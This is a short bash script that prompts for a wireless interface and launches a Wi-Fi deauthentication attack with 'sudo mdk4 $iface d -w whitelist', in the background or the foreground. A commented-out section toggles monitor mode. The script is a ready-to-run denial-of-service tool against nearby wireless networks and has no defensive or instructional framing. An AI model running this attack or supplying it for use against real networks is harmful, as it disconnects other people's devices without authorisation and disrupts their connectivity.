# Just Running iwconfig 
sudo iwconfig 

# Getting Iface Name  
echo "iface : "
read iface

# Let User Choose Between Enabling Monitor Mode Or Disable it 
#echo "U Wanna Enable Monitor Mode Or Disbale it ...  e (Enable ) / d (Disable)"
#read ch

# Doing What User Choosen Using A Switch 
#case $ch in 
#	"e")
#             sudo ip link set $iface down
#             sudo iw dev $iface set type monitor 
#	;;
#	
#         "d")
#	      sudo ip link set $iface down 
#	      sudo iw dev $iface set type managed
#	;;
#esac

# Asking User If whether To Deploy or no
echo "U Wanna Deploy The Attack In The Background Or no ... -1 (Yes In Background) -2 (Yes But Not In Background)  -3 (no) "
read deploy

if  [ $deploy -eq 1 ] 
then

echo "Deploying The Attack ..."
sudo mdk4 $iface d -w whitelist &

elif  [ $deploy -eq 2 ]
then 

echo "Deploying The Attack ..."
sudo mdk4 $iface d -w whitelist 

fi

